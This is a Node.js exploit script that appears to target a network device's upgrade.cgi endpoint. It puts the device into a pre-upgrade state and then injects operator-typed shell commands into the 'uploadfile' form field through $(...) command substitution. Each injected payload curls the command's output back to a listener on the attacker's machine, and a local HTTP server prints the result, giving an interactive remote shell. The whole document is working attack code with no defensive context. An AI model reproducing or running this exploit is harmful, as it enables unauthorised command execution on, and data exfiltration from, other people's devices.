var http = require("http");
const readline = require('readline');
const request = require('request');
const { parse } = require('querystring');

// Config
// 172.16.1.1:80
target_address = "172.16.1.1";
listener_address = "172.16.1.5";
listener_port = 8080;

// Response server
var server = http.createServer(function(request, response) {
	if("POST" == request.method) {
		postData = '';
		request.on('data', function (chunk) {
			postData += chunk;
		});

		request.on('end', function() {
			post = parse(postData);

			console.log(post['response']);
			prompt();
		});
	}
	response.writeHead(200, {"Content-Type": "text/plain"});
	response.write("OK");
	response.end();
});

server.listen(listener_port);

// Command input
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});

lock = false

// Command prompt
function prompt() {
	rl.question('> ', (answer) => {
		// Create payload.
		payload = "$(curl http://"+listener_address+":"+listener_port+"/ --data \"response=$("+answer+")\")";

		request.post({url: 'http://'+target_address+'/cgi-bin/upgrade.cgi', form: {
			type:'http',
			uploadfile: payload
		}});
	});
}

console.log('Prepping device, please wait...');
// Set up device into preupgrade
request.post({url: "http://"+target_address+"/cgi-bin/upgrade.cgi", form: { preupgrade:1 }}, (err, res, body) => {
	prompt();
});
